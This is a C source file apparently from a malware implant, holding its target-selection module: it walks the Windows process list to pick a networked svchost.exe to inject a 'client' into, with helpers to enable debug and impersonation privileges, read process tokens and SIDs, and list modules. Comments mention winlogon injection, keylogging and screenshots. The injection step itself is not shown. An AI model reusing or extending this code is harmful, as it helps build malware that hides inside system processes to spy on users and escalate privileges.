#include "processes.h"

// Returns the PID of process to inject the client into
// Should be modified for your specific needs
// Currently, prefers svchost (system), then networked Svchost (user creds), then maybe Explorer (user creds)
// int main(void)
DWORD GetInjectProcess(void)
{
    HANDLE hProcessSnap;
    HANDLE targetProcess;
    PROCESSENTRY32 pe32;
    HANDLE self = NULL;
    DWORD target = 0;       // Return value

    // Try to get some privs to enable injecting into higher privileged processes
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &self))
    {
		dprintf("Token err: %u\n", GetLastError());
		return 0;
	}

    // If we are elevated, we can try for Winlogon. Otherwise, svchost -> explorer

    // TODO: Inserting into an elevated process is usually in another Session
    // Useless for keylogging, screenshots, interacting with the user
    // Would have to migrate interactive features into session, requires split in code for interactive/non-interactive?
    // BOOL elevated = (SetPriv(self, SE_DEBUG_NAME) && SetPriv(self, SE_IMPERSONATE_NAME));

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        dprintf("Error: Unable to create toolhelp snapshot.\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        dprintf("Error: Unable to retrieve information about the first process.\n");
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Walk the process list
    do
    {
        char *winlogon = NULL;
        char *svchost  = NULL;
        char *explorer = NULL;
        // if (elevated)
        //     winlogon   = strstr(pe32.szExeFile, "ogon");
        // else
        // {
            svchost  = strstr(pe32.szExeFile, "vcho");
        //  explorer = strstr(pe32.szExeFile, "xplo"); // For now, never go into explorer
        // }
        if (!winlogon && !svchost && !explorer)
            continue;

        dprintf("\n\n=====================================================");
        dprintf("\nPROCESS NAME:  %s [%d]", pe32.szExeFile, pe32.th32ProcessID);
        dprintf("\n-------------------------------------------------------");

        TCHAR szProcessPath[MAX_PATH];
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
        if (hProcess != NULL)
        {
            // Print full path of the executable
            if (GetModuleFileNameEx(hProcess, NULL, szProcessPath, MAX_PATH))
            {
                dprintf("\nPath: %s", szProcessPath);
            }
            else
                continue;

            // if (!stricmp("c:\\windows\\system32\\winlogon.exe", szProcessPath))
            // {
            //     target = pe32.th32ProcessID;
            //     break;
            // }

            // Inject into a svchost that already has networking.
            // Right now, this avoids LocalService accounts and puts you into
            // a user-owned svchost
            if (   !stricmp("c:\\windows\\system32\\svchost.exe", szProcessPath) 
                && GetProcessModule(pe32.th32ProcessID, "WS2_32"))
                {
                    // if (elevated)
                    // {
                    //     if (wcsstr(GetProcessUserToken(hProcess), L"S-1-5-18"))
                    //         target = pe32.th32ProcessID;
                    //     else
                    //         continue; // Continue to not hit the break below.
                    // }
                    // else
                        target = pe32.th32ProcessID;
                    dprintf("Breaking.\n");
                    break;
                }
                


            // List loaded modules (DLLs)
            // dprintf("\nLoaded Modules:\n");
            // ListProcessModules(pe32.th32ProcessID);

            // List threads of the process
            // printf("\nThreads:\n");
            // ListProcessThreads(pe32.th32ProcessID);

            // List privileges of the process
            // dprintf("\nPrivileges:\n");
            // GetProcessUserToken(hProcess);

            // List tokens of the process
            // printf("\nTokens:\n");
            // ListProcessTokens(hProcess);

            CloseHandle(hProcess);
        }
        else
        {
            //dprintf("\nError: Unable to open process handle.\n");
        }

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    printf("returning: %d\n", target);
    return target;
}

BOOL GetProcessModule(DWORD processID, char* moduleName)
{
    HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
    MODULEENTRY32 me32;

    hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID);
    if (hModuleSnap == INVALID_HANDLE_VALUE)
    {
        dprintf("Error: Unable to create module snapshot.\n");
        return FALSE;
    }

    me32.dwSize = sizeof(MODULEENTRY32);

    if (!Module32First(hModuleSnap, &me32))
    {
        dprintf("Error: Unable to retrieve information about the first module.\n");
        CloseHandle(hModuleSnap);
        return FALSE;
    }

    // Walk the module list of the process
    do
    {
        // dprintf("\t%s (0x%p)\n", me32.szModule, me32.modBaseAddr);
        if (strstr(me32.szModule, moduleName))
        {
            CloseHandle(hModuleSnap);
            return TRUE;
        }
    } while (Module32Next(hModuleSnap, &me32));

    CloseHandle(hModuleSnap);
    return FALSE;
}

void ListProcessModules(DWORD processID)
{
    HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
    MODULEENTRY32 me32;

    hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID);
    if (hModuleSnap == INVALID_HANDLE_VALUE)
    {
        dprintf("Error: Unable to create module snapshot.\n");
        return;
    }

    me32.dwSize = sizeof(MODULEENTRY32);

    if (!Module32First(hModuleSnap, &me32))
    {
        dprintf("Error: Unable to retrieve information about the first module.\n");
        CloseHandle(hModuleSnap);
        return;
    }

    // Walk the module list of the process
    do
    {
        dprintf("\t%s (0x%p)\n", me32.szModule, me32.modBaseAddr);
    } while (Module32Next(hModuleSnap, &me32));

    CloseHandle(hModuleSnap);
}

void ListProcessPrivileges(HANDLE hProcess)
{
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        dprintf("Error: Unable to open process token.\n");
        return;
    }

    DWORD dwSize = 0;
    PTOKEN_PRIVILEGES ptp = NULL;

    // Get buffer size needed for token privileges
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    if (dwSize == 0)
    {
        dprintf("Error: Unable to get token information size.\n");
        CloseHandle(hToken);
        return;
    }

    ptp = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (ptp == NULL)
    {
        dprintf("Error: Heap allocation failed for token privileges.\n");
        CloseHandle(hToken);
        return;
    }

    // Get token privileges
    if (!GetTokenInformation(hToken, TokenPrivileges, ptp, dwSize, &dwSize))
    {
        dprintf("Error: Unable to get token privileges.\n");
        HeapFree(GetProcessHeap(), 0, ptp);
        CloseHandle(hToken);
        return;
    }

    // List privileges
    for (DWORD i = 0; i < ptp->PrivilegeCount; i++)
    {
        LUID_AND_ATTRIBUTES laa = ptp->Privileges[i];
        DWORD dwSizeName = 0;
        LPSTR pszName = NULL;

        dwSizeName = 0;
        LookupPrivilegeNameA(NULL, &laa.Luid, NULL, &dwSizeName);

        if (dwSizeName > 0)
        {
            pszName = (LPSTR)HeapAlloc(GetProcessHeap(), 0, dwSizeName * sizeof(CHAR));
            if (pszName != NULL)
            {
                if (LookupPrivilegeNameA(NULL, &laa.Luid, pszName, &dwSizeName))
                {
                    dprintf("\t%s\n", pszName);
                }
                HeapFree(GetProcessHeap(), 0, pszName);
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, ptp);
    CloseHandle(hToken);
}

BOOL SetPriv(HANDLE token, char *privilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	int err = 0;

	if (!LookupPrivilegeValueA(
		NULL,       // lookup privilege on local system
		privilege,  // privilege to lookup 
		&luid))     // receives LUID of privilege
	{
		dprintf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Enable the privilege

	AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if ((err = GetLastError()) != ERROR_SUCCESS) {
		dprintf("AdjustTokenPrivileges error: %u\n", err); //Get error here (ie invalid handle)
		return FALSE;
	}
	else {
		dprintf("Applied %s\n", privilege);
	}
	return TRUE;
}

// Takes snapshot of all threads in PID and walks the returned list
/*
void ListProcessThreads(DWORD processID)
{
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    THREADENTRY32 te32;

    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, processID);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
    {
        dprintf("Error: Unable to create thread snapshot.\n");
        return;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreadSnap, &te32))
    {
        dprintf("Error: Unable to retrieve information about the first thread.\n");
        CloseHandle(hThreadSnap);
        return;
    }

    do
    {
        dprintf("\tThread ID: 0x%08X\n", te32.th32ThreadID);
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);
}
*/

// Gets the TokenUser and converts to SID
// returned string needs to be LocalFree()'d
LPWSTR GetProcessUserToken(HANDLE hProcess)
{
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        dprintf("Error: Unable to open process token.\n");
        return NULL;
    }

    DWORD dwSize = 0;
    PTOKEN_USER ptu = NULL;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (dwSize == 0)
    {
        dprintf("Error: Unable to get token information size.\n");
        CloseHandle(hToken);
        return NULL;
    }

    ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (ptu == NULL)
    {
        dprintf("Error: Heap allocation failed for token user.\n");
        CloseHandle(hToken);
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenUser, ptu, dwSize, &dwSize))
    {
        dprintf("Error: Unable to get token user.\n");
        HeapFree(GetProcessHeap(), 0, ptu);
        CloseHandle(hToken);
        return NULL;
    }

    LPWSTR pszSid = NULL;
    if (!ConvertSidToStringSidW(ptu->User.Sid, &pszSid))
    {
        dprintf("Error: Unable to convert SID to string.\n");
        HeapFree(GetProcessHeap(), 0, ptu);
        CloseHandle(hToken);
        return NULL;
    }

    dprintf("\tUser SID: %ws\n", pszSid);

    // LocalFree(pszSid);
    HeapFree(GetProcessHeap(), 0, ptu);
    CloseHandle(hToken);
    return pszSid;
}